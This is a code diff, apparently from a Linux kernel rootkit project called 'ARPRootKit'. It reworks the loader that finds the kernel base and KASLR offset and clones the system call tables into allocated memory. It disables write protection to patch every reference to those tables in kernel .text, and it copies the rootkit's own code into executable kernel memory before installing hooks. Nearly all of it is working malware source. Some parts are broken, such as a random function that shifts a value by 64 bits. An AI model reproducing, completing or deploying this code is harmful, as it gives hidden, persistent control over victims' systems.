@@ -109,6 +109,8 @@
 #define sleep(var) pinfo("Press ENTER to continue..."); KSYSCALL(__NR_read, 0, &var, 1, 0, 0, 0)
 #define MY_PAGE_KERNEL_NOENC (__pgprot(__PAGE_KERNEL))
 #define MY_PAGE_KERNEL_EXEC_NOENC (__pgprot(__PAGE_KERNEL_EXEC))
+#define MY__GFP_WAIT	((__force gfp_t)___GFP_WAIT)	/* Can wait and reschedule? */
+/* Control page allocator reclaim behavior */
 
 /*
  * Kernel shared definitions: labels, variables and functions.
@@ -119,7 +121,8 @@
 /*
  * Module params.
  */
-long image_sct = 0, image_ia32sct = 0, image_text = 0, text_size = 0;
+long image_sct = 0, image_ia32sct = 0, image_text = 0, text_size = 0, image_sct_len = 0, image_ia32sct_len = 0;
+long kernel_base = 0, kaslr_offset = 0;
 
 /*
  * Loader declarations.
@@ -156,13 +159,17 @@ int clone_sct(void *dst, void *src, size_t len);
 int sct_len(void *src, size_t *out_len);
 void install_hooks(void);
 void uninstall_hooks(void);
-void rseed(long);
+int calc_addr_offset(void);
 long rand64(void);
-inline int rand32(void);
+int rand32(void);
 mm_segment_t *search_addr_limit(void);
 long find_kernel_base(long start);
 int load_params(void);
 long *find_int_bytecode_refs(void *addr, size_t len, int bytecode, size_t *olen);
+void *my_vmalloc_range(ulong size, ulong start, ulong end, gfp_t gfp_mask, pgprot_t prot, ulong vm_flags);
+int clone_syscall_tables(void);
+int patch_syscall_tables_refs(void);
+int install_rkkernel(void);
 
 /*
  * Global variables.
@@ -173,7 +180,7 @@ void * (*f__vmalloc_node_range)(unsigned long size, unsigned long align,
 		unsigned long start, unsigned long end, gfp_t gfp_mask,
 		pgprot_t prot, unsigned long vm_flags, int node,
 		const void *caller) = NULL;
-long module_load_offset = 0;
+long vmalloc_start = 0;
 
 /*
  * those clears/sets the WP bit from CR0, to be able to disable the memory write protection.
@@ -182,8 +189,6 @@ void disable_wp(void);
 void enable_wp(void);
 
 int load(void) {
-	size_t my_sct_len = 0, my_sct_pagelen = 0;
-	long addr = 0, kernel_base = 0;
 	int ret = 0;
 
 	addr_limit = search_addr_limit();
@@ -228,8 +233,8 @@ int load(void) {
 		return -2;
 	}
 
-	printk("kernel_tree = %d\n", kernel_tree);
-	printk("get_fs = %lx\n", my_get_fs().seg);
+	pinfo("kernel_tree = %d\n", kernel_tree);
+	pinfo("fs          = %lx\n", my_get_fs().seg);
 	//return -1;
 
 	/*
@@ -248,222 +253,89 @@ int load(void) {
 
 	/*
 	 * Find kernel base.
+	 * Calculate KASLR offset.
 	 * Take offset to sys_call_table, and ia32_sys_call_table (from vmlinuz image offset in param).
 	 * Search all references in .text section. (size in param from vmlinuz image).
 	 */
-	kernel_base = find_kernel_base(0xffffffff81000000); // TODO: replace value by parameter
+	kernel_base = find_kernel_base(image_text); 
+	kaslr_offset = kernel_base - image_text;
 	sys_call_table = (void *)(kernel_base - image_text + image_sct);
 	ia32_sys_call_table = (void *)(kernel_base - image_text + image_ia32sct);
 
-	printk("kernel_base         = %lx\n", kernel_base);
-	printk("image .text         = %lx\n", image_text);
-	printk("image sct           = %lx\n", image_sct);
-	printk("image ia32sct       = %lx\n", image_ia32sct);
-	printk(".text size          = %ld\n", text_size);
-	printk("sys_call_table      = %lx\n", sys_call_table);
-	printk("ia32_sys_call_table = %lx\n", ia32_sys_call_table);
-
-	sct_refs = find_int_bytecode_refs(kernel_base, text_size, (int)sys_call_table, &nsct_refs);
-	pinfo("Found %d refs to sys_call_table.\n", nsct_refs);
-	ia32sct_refs = find_int_bytecode_refs(kernel_base, text_size, (int)ia32_sys_call_table, &nia32sct_refs);
-	pinfo("Found %d refs to ia32_sys_call_table.\n", nia32sct_refs);
-
-	return -1;
-
-	/*
-	 * Search sys_call_table[] address.
-	 */
-	/*
-	tmp = search_sct_fastpath(&psct_fastpath);
-	if (tmp == NULL) {
-		return -2;
-	}
-	printk("fastpath = %lx\n", tmp);
-	if (search_sct_slowpath(&psct_slowpath) != tmp) {
-		return -2;
-	}
-	sys_call_table = tmp;
-	ia32_sys_call_table = search_ia32sct_int80h(&pia32sct);
-	if (ia32_sys_call_table == NULL) {
-		perr("Sorry, can't find sys_call_table in int 0x80.\n");
-		return -2;
-	}
-	*/
-	pinfo("Hurra! sys_call_table = %lx, fastpath_location = %lx, slowpath_location = %lx, ia32_sys_call_table = %lx, pia32sct = %lx\n", sys_call_table, psct_fastpath, psct_slowpath,
-			ia32_sys_call_table, pia32sct);
+	pinfo("Parameters:\n");
+	pinfo("kernel_base         = %lx\n", kernel_base);
+	pinfo("image .text         = %lx\n", image_text);
+	pinfo("image sct           = %lx\n", image_sct);
+	pinfo("image sct len       = %ld\n", image_sct_len);
+	pinfo("image ia32sct       = %lx\n", image_ia32sct);
+	pinfo("image ia32sct len   = %ld\n", image_ia32sct_len);
+	pinfo(".text size          = %ld\n", text_size);
+	pinfo("sys_call_table      = %lx\n", sys_call_table);
+	pinfo("ia32_sys_call_table = %lx\n", ia32_sys_call_table);
+	
+	sct_refs = find_int_bytecode_refs((void *)kernel_base, text_size, (int)sys_call_table, &nsct_refs);
+	pinfo("Found %d refs to sys_call_table in kernel's .text\n", nsct_refs);
+	ia32sct_refs = find_int_bytecode_refs((void *)kernel_base, text_size, (int)ia32_sys_call_table, &nia32sct_refs);
+	pinfo("Found %d refs to ia32_sys_call_table in kernel's .text\n", nia32sct_refs);
 
 	/*
 	 * Search not exported symbols.
 	 */
-	/*
-	   f_change_page_attr_set_clr = search_change_page_attr_set_clr(set_memory_x);
-	   if (f_change_page_attr_set_clr != NULL) {
-	   pinfo("Hurra! change_page_attr_set_clr() = %lx\n", f_change_page_attr_set_clr);
-	   } else {
-	   perr("Sorry, can't find change_page_attr_set_clr().\n");
-	   return 0;
-	   }
-	 */
-	f__vmalloc_node_range = search___vmalloc_node_range(__vmalloc);
-	if (f__vmalloc_node_range != NULL) {
-		pinfo("Hurra! __vmalloc_node_range() = %lx\n", f__vmalloc_node_range);
-	} else {
-		perr("Sorry, can't find __vmalloc_node_range().\n");
-		return -2;
-	}
+	//f__vmalloc_node_range = search___vmalloc_node_range(__vmalloc);
+	//if (f__vmalloc_node_range != NULL) {
+	//	pinfo("__vmalloc_node_range() = %lx\n", f__vmalloc_node_range);
+	//} else {
+	//	perr("Sorry, can't find __vmalloc_node_range().\n");
+	//	return -2;
+	//}
 
 	/*
-	 * Reserve & clone a new (our) sys_call_table.
+	 * Clone the syscall tables.
 	 */
-	ret = sct_len(sys_call_table, &my_sct_len);
-	if (ret != 0) {
-		perr("Sorry, sct_len(sys_call_table) ret = %d.\n", ret);
+	if (clone_syscall_tables()) {
+		perr("Sorry, can't clone_syscall_tables().\n");
 		return -2;
 	}
-	pinfo("sys_call_table len = %d\n", my_sct_len);
-
-	my_sct_pagelen = PAGE_ROUND_UP(my_sct_len * sizeof(long));
-	rseed(get_seconds());
-	module_load_offset = (rand32() % 1024 + 1) * PAGE_SIZE;
-	pinfo("module_load_offset = %x, addr would be = %lx\n", module_load_offset, MODULES_VADDR + module_load_offset);
-	my_sct = f__vmalloc_node_range(my_sct_pagelen, 1, MODULES_VADDR, MODULES_END, GFP_KERNEL, MY_PAGE_KERNEL_NOENC, 0, NUMA_NO_NODE, __builtin_return_address(0));
-	//my_sct = vmalloc(my_sct_pagelen);
-	if (my_sct == NULL) {
-		perr("Sorry, can't reserve memory with __vmalloc_node_range() for my_sct.\n");
-		return -2;
-	}
-	pinfo("reserved %d bytes at %lx\n", my_sct_pagelen, my_sct);
-
-	// zero memory
-	ret = safe_zero(my_sct, my_sct_pagelen);
-	if (ret != 0) {
-		perr("Sorry, can't zero memory of my_sct.\n");
-		return -2;
-	}
-	pinfo("my_sct zeroed!\n");
-
-	//sleep(ret);
-
-	ret = clone_sct(my_sct, sys_call_table, my_sct_len);
-	if (ret != 0) {
-		perr("Sorry, can't clone sys_call_table.\n");
-		return -2;
-	}
-	pinfo("my_sct = %lx, len = %d\n", my_sct, my_sct_len);
-
+	
 	//sleep(ret);
 
 	/*
-	 * Clone the ia32 sct.
+	 * Patch references to syscall tables, on the .text section.
 	 */
-	ret = sct_len(ia32_sys_call_table, &my_sct_len);
-	if (ret != 0) {
-		perr("Sorry, sct_len(ia32_sct) ret = %d.\n", ret);
-		// TODO: free memory.
+	if (patch_syscall_tables_refs()) {
+		perr("Sorry, can't patch_syscall_tables_refs().\n");
 		return -2;
 	}
-	pinfo("ia32_sct len = %d\n", my_sct_len);
-
-	//sleep(ret);
-
-	my_sct_pagelen = PAGE_ROUND_UP(my_sct_len * sizeof(long));
-	// TODO: add KASLR offset in start address.
-	my_ia32sct = f__vmalloc_node_range(my_sct_pagelen, 1, MODULES_VADDR, MODULES_END, GFP_KERNEL, MY_PAGE_KERNEL_NOENC, 0, NUMA_NO_NODE, __builtin_return_address(0));
-	if (my_ia32sct == NULL) {
-		perr("Sorry, can't reserve memory for my_ia32sct.\n");
-		return -2;
-	}
-	pinfo("reserved %d bytes at %lx.\n", my_sct_pagelen, my_ia32sct);
-
-	//sleep(ret);
-
-	// zero memory
-	ret = safe_zero(my_ia32sct, my_sct_pagelen);
-	if (ret != 0) {
-		perr("Sorry, can't zero memory for our sct.\n");
-		return -2;
-	}
-	pinfo("my_ia32sct zeroed!\n");	
-
-	//sleep(ret);
-
-	ret = clone_sct(my_ia32sct, ia32_sys_call_table, my_sct_len);
-	if (ret != 0) {
-		perr("Sorry, clone_sct(my_ia32sct) ret = %d.\n", ret);
-		// TODO: free memory
-		return -2;
-	}
-	pinfo("ia32_sct cloned at = %lx\n", my_ia32sct);
-
-	//sleep(ret);
-
-	/*
-	 * Install the new SCTs into SYSCALL handler, and int 0x80 handler.
-	 */
-	pinfo("before psct_fastpath = %x, psct_slowpath = %x, pia32sct = %x\n", *psct_fastpath, *psct_slowpath, *pia32sct);
-	addr = (int) my_sct;
-	disable_wp();
-	ret = probe_kernel_write(psct_fastpath, &addr, sizeof(int));
-	ret = probe_kernel_write(psct_slowpath, &addr, sizeof(int));
-	addr = (int) my_ia32sct;
-	ret = probe_kernel_write(pia32sct, &addr, sizeof(int));
-	enable_wp();
-	if (ret != 0) {
-		perr("Sorry, error while replacing sys_call_table on SYSCALL handler.\n");
-		return -2;
-	}
-	pinfo("after psct_fastpath = %x, psct_slowpath = %x, pia32sct = %x\n", *psct_fastpath, *psct_slowpath, *pia32sct);
 
 	//sleep(ret);
 
 	/*
 	 * Insert out rootkit into memory.
 	 */
-	pinfo("kernel_len = %d, kernel_paglen = %d, kernel_pages = %d, kernel_start = %lx, kernel_start_pagdown = %lx\n", kernel_len, kernel_paglen, kernel_pages, &kernel_start, PAGE_ROUND_DOWN(&kernel_start));
-	//kernel_addr = f_kmalloc(kernel_paglen, GFP_KERNEL);
-	kernel_addr = f__vmalloc_node_range(kernel_paglen, 1, MODULES_VADDR, MODULES_END, GFP_KERNEL, MY_PAGE_KERNEL_EXEC_NOENC, 0, NUMA_NO_NODE, __builtin_return_address(0));
-	if (kernel_addr != NULL) {
-		pinfo("kernel_addr = %lx, kernel_addr_pagdown = %lx\n", kernel_addr, PAGE_ROUND_DOWN(kernel_addr));
-		/*
-		 * Make our rootkit code executable.
-		 */
-		//ret = set_memory_x(PAGE_ROUND_DOWN(kernel_addr), kernel_pages);
-		//pinfo("ret = %d\n", ret);
-		//pinfo("kernel_addr's pages are now executable.\n");
-
-		ret = probe_kernel_write(kernel_addr, &kernel_start, kernel_len);
-		if (ret != 0) {
-			perr("Sorry, can't copy kernel to its place.\n");
-			return -2;
-		}
-		//memcpy(kernel_addr, &kernel_start, kernel_len);
-		//pinfo("kernel is now copied to kernel_addr.\n");
-
-		//disassemble(kernel_addr + ((unsigned long)&kernel_code_start - (unsigned long)&kernel_start), ((unsigned long)&kernel_end - (unsigned long)&kernel_code_start));
-
-		kernel_test();
-
-		//pinfo("kernel_test execution from LKM successful.\n");
-
-		f_kernel_test = kernel_addr + ((unsigned long)&kernel_test - (unsigned long)&kernel_start);
-		//pinfo("f_kernel_test at %lx\n", f_kernel_test);
-		f_kernel_test();
-		pinfo("f_kernel_test execution from allocated code, successful.\n");
-
-		//hook_kernel_funcs();
-
-		//pinfo("ARPRootKit successfully installed!\n");
-
-		// uncomment for testing:
-		//(*f_kfree())(kernel_addr);
-
-		install_hooks();
-		sleep(ret);
-		uninstall_hooks();
-	} else {
-		perr("can not allocate memory.\n");
-		return -2;
+	if (install_rkkernel()) {
+		perr("Sorry, can't install_rkkernel().\n");
 	}
+
+	//kernel_test();
+
+	f_kernel_test = kernel_addr + ((unsigned long)&kernel_test - (unsigned long)&kernel_start);
+	//pinfo("f_kernel_test at %lx\n", f_kernel_test);
+	pinfo("Calling RK's Kernel test function ...\n");
+	f_kernel_test();
+
+	// uncomment for testing:
+	//(*f_kfree())(kernel_addr);
+
+	return -1;
+
+	/*
+	 * Setup hooks, and we're done.
+	 */
+	install_hooks();
+	sleep(ret);
+	uninstall_hooks();
+
+	//pinfo("ARPRootKit successfully installed!\n");
 
 	return -1;
 }
@@ -1021,24 +893,17 @@ inline unsigned long long notrace my_rdmsr(unsigned int msr)
 	return MY_EAX_EDX_VAL(val, low, high);
 }
 
-// from https://stackoverflow.com/questions/15038174/generate-random-numbers-without-using-any-external-functions
-long rand_a = 0xdeadbabe15c0ffee;   // These Values for a and c are the actual values found
-long rand_c = 11;            // in the implementation of java.util.Random(), see link
-long rand_previous = 0;
-
-void rseed(long seed) {
-	rand_previous = seed;
-}
-
 long rand64(void) {
-	long r = rand_a * rand_previous + rand_c;
-	// Note: typically, one chooses only a couple of bits of this value, see link
-	rand_previous = r;
-	return r;
+    long r = get_seconds() << 64;
+    return r;
 }
 
-inline int rand32(void) {
-	return (int)rand64();
+int rand32(void) {
+    return (int)rand64();
+}
+
+int calc_addr_offset(void) {
+    return (rand32() % 1024 + 1) * PAGE_SIZE;;
 }
 
 /*
@@ -1089,6 +954,10 @@ long find_kernel_base(long start) {
 	return start + off - inc;
 }
 
+/*
+ * Load parameters from user-land's loader, into this kernel-space.
+ * For that, we use an intermediate file, because passing args here is not generic.
+ */
 int load_params(void) {
 	void *tmp = NULL;
 	int ret = 0;
@@ -1114,28 +983,40 @@ int load_params(void) {
 	old_fs = my_get_fs();
 	my_set_fs(KERNEL_DS);
 	ret = read_code(tmp, (ulong)&image_text, pos, sizeof(image_text));
-	if (ret != sizeof(image_text)) {
+	if (ret != sizeof(long)) {
 		perr("Sorry, can't read from params' file.\n");
 		return -2;
 	}
 	pos += ret;
 	ret = read_code(tmp, (ulong)&image_sct, pos, sizeof(image_sct));
-	if (ret != sizeof(image_sct)) {
+	if (ret != sizeof(long)) {
 		perr("Sorry, can't read from params' file.\n");
 		return -2;
 	}
 	pos += ret;
 	ret = read_code(tmp, (ulong)&image_ia32sct, pos, sizeof(image_ia32sct));
-	if (ret != sizeof(image_ia32sct)) {
+	if (ret != sizeof(long)) {
 		perr("Sorry, can't read from params' file.\n");
 		return -2;
 	}
 	pos += ret;
 	ret = read_code(tmp, (ulong)&text_size, pos, sizeof(text_size));
-	if (ret != sizeof(text_size)) {
+	if (ret != sizeof(long)) {
 		perr("Sorry, can't read from params' file.\n");
 		return -2;
 	}
+    pos += ret;
+    ret = read_code(tmp, (ulong)&image_sct_len, pos, sizeof(image_sct_len));
+    if (ret != sizeof(long)) {
+        perr("Sorry, can't read from params' file.\n");
+        return -2;
+	}
+    pos += ret;
+    ret = read_code(tmp, (ulong)&image_ia32sct_len, pos, sizeof(image_ia32sct_len));
+    if (ret != sizeof(long)) {
+        perr("Sorry, can't read from params' file.\n");
+        return -2;
+    }
 	my_set_fs(old_fs);
 	filp_close(tmp, NULL);
 
@@ -1172,4 +1053,257 @@ long *find_int_bytecode_refs(void *addr, size_t len, int bytecode, size_t *olen)
     }
 
 	return refs;
+}
+
+void *my_vmalloc_area(struct vm_struct *area, gfp_t gfp_mask, pgprot_t prot) {
+	struct page **pages;
+	unsigned int nr_pages, array_size, i;
+	const gfp_t nested_gfp = __GFP_ZERO;
+	const gfp_t alloc_mask = gfp_mask | __GFP_NOWARN;
+
+	nr_pages = get_vm_area_size(area) >> PAGE_SHIFT;
+	array_size = (nr_pages * sizeof(struct page *));
+
+	area->nr_pages = nr_pages;
+	/* Please note that the recursion is strictly bounded. */
+	if (array_size > PAGE_SIZE) {
+		pages = __vmalloc(array_size, nested_gfp | __GFP_HIGHMEM, MY_PAGE_KERNEL_NOENC);
+		area->flags |= 0x10; // VM_VPAGES
+	} else {
+		pages = kmalloc(array_size, nested_gfp);
+	}
+	area->pages = pages;
+	if (!area->pages) {
+		free_vm_area(area);
+		return NULL;
+	}
+
+	for (i = 0; i < area->nr_pages; i++) {
+		struct page *page;
+
+		page = alloc_page(alloc_mask);
+
+		if (unlikely(!page)) {
+			/* Successfully allocated i pages, free them in __vunmap() */
+			area->nr_pages = i;
+			goto fail;
+		}
+		area->pages[i] = page;
+		if (gfp_mask & 0x10u) // __GFP_WAIT or __GFP_RECLAIMABLE
+			cond_resched();
+	}
+
+	if (map_vm_area(area, prot, pages))
+		goto fail;
+	return area->addr;
+
+fail:
+	vfree(area->addr);
+	return NULL;
+}
+
+inline void clear_vm_uninitialized_flag(struct vm_struct *vm) {
+	/*
+	 * Before removing VM_UNINITIALIZED,
+	 * we should make sure that vm has proper values.
+	 * Pair with smp_rmb() in show_numa_info().
+	 */
+	smp_wmb();
+	vm->flags &= ~VM_UNINITIALIZED;
+}
+
+void *my_vmalloc_range(ulong size, ulong start, ulong end, gfp_t gfp_mask, pgprot_t prot, ulong vm_flags) {
+	struct vm_struct *area;
+	void *addr;
+	unsigned long real_size = size;
+
+	area = __get_vm_area(size, vm_flags, start, end);
+	if (!area)
+		goto fail;
+
+	addr = my_vmalloc_area(area, gfp_mask, prot);
+	if (!addr)
+		return NULL;
+
+	/*
+	 * In this function, newly allocated vm_struct has VM_UNINITIALIZED
+	 * flag. It means that vm_struct is not fully initialized.
+	 * Now, it is fully initialized, so remove this flag here.
+	 */
+	clear_vm_uninitialized_flag(area);
+
+	/*
+	 * A ref_count = 2 is needed because vm_struct allocated in
+	 * __get_vm_area_node() contains a reference to the virtual address of
+	 * the vmalloc'ed block.
+	 */
+	kmemleak_alloc(addr, real_size, 2, gfp_mask);
+
+	return addr;
+
+fail:
+	return NULL;
+}
+
+int clone_syscall_tables(void) {
+	size_t my_sct_pagelen = 0;
+	int ret = 0;
+
+    //ret = sct_len(sys_call_table, &my_sct_len);
+    //if (ret != 0) {
+    //  perr("Sorry, sct_len(sys_call_table) ret = %d.\n", ret);
+    //  return -2;
+    //}
+    //pinfo("sys_call_table len = %d\n", my_sct_len);
+
+	my_sct_pagelen = PAGE_ROUND_UP(image_sct_len * sizeof(void *));
+	vmalloc_start = MODULES_VADDR + calc_addr_offset();
+	pinfo("vmalloc_start = %lx\n", vmalloc_start);
+	//my_sct = f__vmalloc_node_range(my_sct_pagelen, 1, MODULES_VADDR, MODULES_END, GFP_KERNEL, MY_PAGE_KERNEL_NOENC, 0, NUMA_NO_NODE, __builtin_return_address(0));
+	my_sct = my_vmalloc_range(my_sct_pagelen, vmalloc_start, MODULES_END, GFP_KERNEL, MY_PAGE_KERNEL_NOENC, 0);
+	//my_sct = vmalloc(my_sct_pagelen);
+	if (my_sct == NULL) {
+		perr("Sorry, can't reserve memory with my_vmalloc_range() for my_sct.\n");
+		return -2;
+	}
+	pinfo("reserved %d bytes at %lx\n", my_sct_pagelen, my_sct);
+
+	// zero memory
+	ret = safe_zero(my_sct, my_sct_pagelen);
+	if (ret != 0) {
+		perr("Sorry, can't zero memory of my_sct.\n");
+		return -2;
+	}
+	pinfo("my_sct zeroed!\n");
+
+	//sleep(ret);
+
+	ret = clone_sct(my_sct, sys_call_table, image_sct_len);
+	if (ret != 0) {
+		perr("Sorry, can't clone sys_call_table.\n");
+		return -2;
+	}
+	pinfo("my_sct = %lx, len = %d\n", my_sct, image_sct_len);
+
+	//sleep(ret);
+
+	//ret = sct_len(ia32_sys_call_table, &my_sct_len);
+	//if (ret != 0) {
+	//	perr("Sorry, sct_len(ia32_sct) ret = %d.\n", ret);
+		// TODO: free memory.
+	//	return -2;
+	//}
+	//pinfo("ia32_sct len = %d\n", my_sct_len);
+
+	//sleep(ret);
+
+	my_sct_pagelen = PAGE_ROUND_UP(image_ia32sct_len * sizeof(void *));
+	// TODO: add KASLR offset in start address.
+	//my_ia32sct = f__vmalloc_node_range(my_sct_pagelen, 1, MODULES_VADDR, MODULES_END, GFP_KERNEL, MY_PAGE_KERNEL_NOENC, 0, NUMA_NO_NODE, __builtin_return_address(0));
+	my_ia32sct = my_vmalloc_range(my_sct_pagelen, vmalloc_start, MODULES_END, GFP_KERNEL, MY_PAGE_KERNEL_NOENC, 0);
+	if (my_ia32sct == NULL) {
+		perr("Sorry, can't reserve memory for my_ia32sct.\n");
+		return -2;
+	}
+	pinfo("reserved %d bytes at %lx.\n", my_sct_pagelen, my_ia32sct);
+
+	//sleep(ret);
+
+	// zero memory
+	ret = safe_zero(my_ia32sct, my_sct_pagelen);
+	if (ret != 0) {
+		perr("Sorry, can't zero memory for our sct.\n");
+		return -2;
+	}
+	pinfo("my_ia32sct zeroed!\n");	
+
+	//sleep(ret);
+
+	ret = clone_sct(my_ia32sct, ia32_sys_call_table, image_ia32sct_len);
+	if (ret != 0) {
+		perr("Sorry, clone_sct(my_ia32sct) ret = %d.\n", ret);
+		// TODO: free memory
+		return -2;
+	}
+	pinfo("ia32_sct cloned at = %lx\n", my_ia32sct);
+
+	return 0;
+}
+
+int patch_syscall_tables_refs(void) {
+	int n = 0, addr = 0, ret = 0, *p = NULL;
+
+	// first patch refs to sys_call_table, and later to ia32_sys_call_table
+	for (; n < nsct_refs; n++) {
+		p = (int *) sct_refs[n];
+		pinfo("patching ref %d of sys_call_table %lx ...\n", n, p);
+	    pinfo("value before patch = %x\n", *p);
+		disable_wp();
+		addr = (int) my_sct;
+	    ret = probe_kernel_write(p, &addr, sizeof(int));
+		enable_wp();
+		pinfo("value after patch = %lx\n", *p);
+		if (ret != 0) {
+			return -2;
+		}
+	}
+
+    for (n = 0; n < nia32sct_refs; n++) {
+        p = (int *) ia32sct_refs[n];
+        pinfo("patching ref %d of ia32_sys_call_table %lx ...\n", n, p);
+        pinfo("value before patch = %x\n", *p);
+        disable_wp();
+        addr = (int) my_ia32sct;
+        ret = probe_kernel_write(p, &addr, sizeof(int));
+        enable_wp();
+        pinfo("value after patch = %lx\n", *p);
+        if (ret != 0) {
+            return -2;
+        }
+    }
+
+	return 0;
+}
+
+int install_rkkernel(void) {
+	int ret = 0;
+
+	pinfo("Installing the rootkit's kernel ...\n");
+
+	pinfo("RK's Kernel info:\n");
+    pinfo("kernel_len           = %d\n", kernel_len);
+	pinfo("kernel_paglen        = %d\n", kernel_paglen);
+	pinfo("kernel_pages         = %d\n", kernel_pages);
+	pinfo("kernel_start         = %lx\n", &kernel_start);
+	pinfo("kernel_start_pagdown = %lx\n", PAGE_ROUND_DOWN(&kernel_start));
+    
+	//kernel_addr = f_kmalloc(kernel_paglen, GFP_KERNEL);
+    //kernel_addr = f__vmalloc_node_range(kernel_paglen, 1, MODULES_VADDR, MODULES_END, GFP_KERNEL, MY_PAGE_KERNEL_EXEC_NOENC, 0, NUMA_NO_NODE, __builtin_return_address(0));
+    kernel_addr = my_vmalloc_range(kernel_paglen, vmalloc_start, MODULES_END, GFP_KERNEL, MY_PAGE_KERNEL_EXEC_NOENC, 0);
+    if (kernel_addr == NULL) {
+        perr("Sorry, can't allocate memory.\n");
+        return -2;
+    }
+    
+	pinfo("kernel_addr          = %lx\n", kernel_addr);
+	pinfo("kernel_addr_pagdown  = %lx\n", PAGE_ROUND_DOWN(kernel_addr));
+
+    /*
+     * Make our rootkit code executable.
+     */
+    //ret = set_memory_x(PAGE_ROUND_DOWN(kernel_addr), kernel_pages);
+    //pinfo("ret = %d\n", ret);
+    //pinfo("kernel_addr's pages are now executable.\n");
+
+    ret = probe_kernel_write(kernel_addr, &kernel_start, kernel_len);
+    if (ret != 0) {
+        perr("Sorry, can't copy kernel to its place.\n");
+        return -2;
+    }
+
+	pinfo("RK's Kernel is now installed.\n");
+
+    //disassemble(kernel_addr + ((unsigned long)&kernel_code_start - (unsigned long)&kernel_start), ((unsigned long)&kernel_end - (unsigned long)&kernel_code_start));
+
+	return 0;
 }
